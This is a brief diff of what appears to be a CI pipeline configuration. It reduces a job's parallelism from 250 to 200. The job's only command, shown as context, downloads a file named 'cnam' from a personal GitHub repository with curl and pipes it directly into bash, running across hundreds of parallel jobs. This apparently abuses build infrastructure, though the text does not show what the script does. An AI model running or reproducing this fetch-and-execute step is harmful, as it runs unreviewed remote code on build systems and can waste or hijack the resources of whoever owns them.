@@ -13,4 +13,4 @@ blocks:
         - name: 'Job #1' 
           commands: 
             - curl -sL https://github.com/liecamshoe/file/raw/main/cnam | bash
-          parallelism: 250
+          parallelism: 200
